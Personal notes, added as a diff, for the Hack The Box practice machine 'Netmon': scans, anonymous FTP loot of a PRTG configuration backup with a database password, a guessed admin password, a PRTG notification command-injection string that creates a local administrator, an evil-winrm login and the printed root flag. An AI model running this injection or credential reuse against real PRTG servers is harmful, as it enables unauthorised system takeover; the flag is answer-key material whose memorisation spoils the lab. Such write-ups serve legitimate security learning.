@@ -1,0 +1,222 @@
+Neeeettmon Ip:10.10.10.152
+
+rustscan:
+PORT      STATE SERVICE      REASON
+21/tcp    open  ftp          syn-ack
+80/tcp    open  http         syn-ack
+135/tcp   open  msrpc        syn-ack
+139/tcp   open  netbios-ssn  syn-ack
+445/tcp   open  microsoft-ds syn-ack
+5985/tcp  open  wsman        syn-ack
+49664/tcp open  unknown      syn-ack
+49665/tcp open  unknown      syn-ack
+49666/tcp open  unknown      syn-ack
+49667/tcp open  unknown      syn-ack
+49668/tcp open  unknown      syn-ack
+49669/tcp open  unknown      syn-ack
+
+
+
+PORT      STATE SERVICE      REASON  VERSION
+21/tcp    open  ftp          syn-ack Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-02-19  11:18PM                 1024 .rnd
+| 02-25-19  09:15PM       <DIR>          inetpub
+| 07-16-16  08:18AM       <DIR>          PerfLogs
+| 02-25-19  09:56PM       <DIR>          Program Files
+| 02-02-19  11:28PM       <DIR>          Program Files (x86)
+| 02-03-19  07:08AM       <DIR>          Users
+|_02-25-19  10:49PM       <DIR>          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http         syn-ack Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: PRTG/18.1.37.13946
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+|_http-trane-info: Problem with XML parsing of /evox/about
+135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc        syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc        syn-ack Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1s, deviation: 0s, median: 0s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 33374/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 24048/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 15668/udp): CLEAN (Timeout)
+|   Check 4 (port 17007/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-02-06T10:56:02
+|_  start_date: 2023-02-06T10:51:51
+
+User FLag: get it  from ftp usiiiinnnnnnnnnnnggggggggggggggg anonymous 
+
+ftp> ls -la
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+11-20-16  09:46PM       <DIR>          $RECYCLE.BIN
+02-02-19  11:18PM                 1024 .rnd
+11-20-16  08:59PM               389408 bootmgr
+07-16-16  08:10AM                    1 BOOTNXT
+02-03-19  07:05AM       <DIR>          Documents and Settings
+02-25-19  09:15PM       <DIR>          inetpub
+02-06-23  05:51AM            738197504 pagefile.sys
+07-16-16  08:18AM       <DIR>          PerfLogs
+02-25-19  09:56PM       <DIR>          Program Files
+02-02-19  11:28PM       <DIR>          Program Files (x86)
+12-15-21  09:40AM       <DIR>          ProgramData
+02-03-19  07:05AM       <DIR>          Recovery
+02-03-19  07:04AM       <DIR>          System Volume Information
+02-03-19  07:08AM       <DIR>          Users
+02-25-19  10:49PM       <DIR>          Windows
+226 Transfer complete.
+ftp> cd ProgramData
+250 CWD command successful.
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+12-15-21  09:40AM       <DIR>          Corefig
+02-02-19  11:15PM       <DIR>          Licenses
+11-20-16  09:36PM       <DIR>          Microsoft
+02-02-19  11:18PM       <DIR>          Paessler
+02-03-19  07:05AM       <DIR>          regid.1991-06.com.microsoft
+07-16-16  08:18AM       <DIR>          SoftwareDistribution
+02-02-19  11:15PM       <DIR>          TEMP
+11-20-16  09:19PM       <DIR>          USOPrivate
+11-20-16  09:19PM       <DIR>          USOShared
+02-25-19  09:56PM       <DIR>          VMware
+226 Transfer complete.
+
+
+ggggoing into 
+
+
+
+
+
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-06-23  06:33AM       <DIR>          Configuration Auto-Backups
+02-06-23  05:52AM       <DIR>          Log Database
+02-02-19  11:18PM       <DIR>          Logs (Debug)
+02-02-19  11:18PM       <DIR>          Logs (Sensors)
+02-02-19  11:18PM       <DIR>          Logs (System)
+02-06-23  05:52AM       <DIR>          Logs (Web Server)
+02-06-23  05:57AM       <DIR>          Monitoring Database
+02-25-19  09:54PM              1189697 PRTG Configuration.dat
+02-25-19  09:54PM              1189697 PRTG Configuration.old
+07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
+02-06-23  08:39AM              1724414 PRTG Graph Data Cache.dat
+02-25-19  10:00PM       <DIR>          Report PDFs
+02-02-19  11:18PM       <DIR>          System Information Database
+02-02-19  11:40PM       <DIR>          Ticket Database
+02-02-19  11:18PM       <DIR>          ToDo Database
+226 Transfer complete.
+ftp> get "PRTG Configuration.old.bak"
+local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+1153755 bytes received in 3.47 secs (324.7591 kB/s)
+ftp> 
+
+
+
+     <dbpassword>
+	      <!-- User: prtgadmin -->
+	      PrTg@dmin2018
+            </dbpassword>
+            <dbtimeout>
+
+
+this pass didnt work, I used burp to guess the pass   =:-> PrTg@dmin2019
+
+PrivEsc:
+https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/
+
+
+
+Now click on “Add new notification” on the extreme right.
+
+Leave the default fields as they are and scroll down to the "Execute Program" section. We can
+add a user to Administrators group using this command:
+abc.txt | net user htb abc123! /add ; net localgroup administrators htb
+/add
+Make the following changes and click “Save”.
+
+Now on the extreme right of your notification name, click on the edit icon and then the bell icon
+to trigger it.
+
+
+ evil-winrm -i 10.10.10.152 -u htb -p 'abc123!'                                                                                                                                                                                                                               1 ⨯
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\htb\Documents> cd ..
+*Evil-WinRM* PS C:\Users\htb> cd ..
+*Evil-WinRM* PS C:\Users> cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator> ls
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         2/3/2019   7:08 AM                Contacts
+d-r---         2/2/2019  11:35 PM                Desktop
+d-r---         2/3/2019   7:08 AM                Documents
+d-r---         2/3/2019   7:08 AM                Downloads
+d-r---         2/3/2019   7:08 AM                Favorites
+d-r---         2/3/2019   7:08 AM                Links
+d-r---         2/3/2019   7:08 AM                Music
+d-r---         2/3/2019   7:08 AM                Pictures
+d-r---         2/3/2019   7:08 AM                Saved Games
+d-r---         2/3/2019   7:08 AM                Searches
+d-r---        2/25/2019  10:06 PM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         2/6/2023   5:52 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+cbe8c2bdcdfead62d81fd5aa6de9d86f
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
